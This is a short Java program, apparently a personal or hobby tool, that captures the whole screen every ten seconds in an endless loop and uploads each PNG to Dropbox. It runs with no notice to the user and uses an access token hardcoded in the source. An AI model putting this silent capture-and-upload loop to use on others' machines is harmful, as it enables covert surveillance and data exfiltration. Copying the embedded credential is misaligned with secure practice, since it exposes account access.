import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

import static java.lang.Thread.sleep;

public class ScreenCapMain {

    public static void main(String[] args) {


        final String ACCESS_TOKEN = "W4Md5J_Sa5AAAAAAAAAAAVsHqEgowVi72EJq20_zcaW_YTTbyO5rAWpsmo5YSMq1";
        Robot r = null;
        try {
            r = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/ScreenCap").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        for(;;) {

            BufferedImage image = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream os = new ByteArrayOutputStream();

            try {
                ImageIO.write(image, "png", os);
            } catch (IOException e) {
                e.printStackTrace();
            }

            InputStream in = new ByteArrayInputStream(os.toByteArray());

            UploadThread upl = new UploadThread(client, in);

            upl.start();

            try {
                sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

}
